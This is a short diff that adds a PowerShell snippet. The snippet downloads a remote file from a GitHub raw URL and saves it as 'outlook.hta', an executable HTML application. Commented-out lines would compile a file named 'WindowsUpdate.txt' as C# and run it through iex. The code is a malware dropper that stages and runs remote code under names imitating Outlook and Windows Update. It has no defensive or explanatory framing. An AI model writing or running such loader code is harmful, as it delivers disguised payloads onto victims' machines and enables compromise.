@@ -1,0 +1,4 @@
+(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/CYBER4CE/ST/master/outlook.txt', 'outlook.hta'); 
+#$code = [IO.File]::ReadAllText('.\WindowsUpdate.txt'); 
+#Add-Type -TypeDefinition $code -Language CSharp; 
+#iex '[WindowsUpdate.Program]::Main()';
